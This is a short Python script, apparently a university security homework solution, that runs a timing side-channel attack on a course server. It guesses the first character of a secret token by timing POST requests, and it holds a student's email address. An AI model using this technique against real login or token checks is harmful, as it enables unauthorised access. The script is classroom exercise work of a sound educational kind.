```python
import requests
import json
import time
letters = '*abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+=1234567890'
match = '*'
so_far = 0
for i in range(0,len(letters)):
    x = letters[i]
    for j in range(0,11):
        x += '*'
    payload = {'email': 'zeineb.sahnoun@epfl.ch', 'token': x}
    begin=time.time()
    r = requests.post('http://com402.epfl.ch/hw5/ex3', json=payload)
    end=time.time()
    diff=end-begin
    if(diff>so_far):
        so_far=diff
        match=letters[i]
    print("letter : ", x, "time taken : ", diff)
print(match)
print(so_far)
```
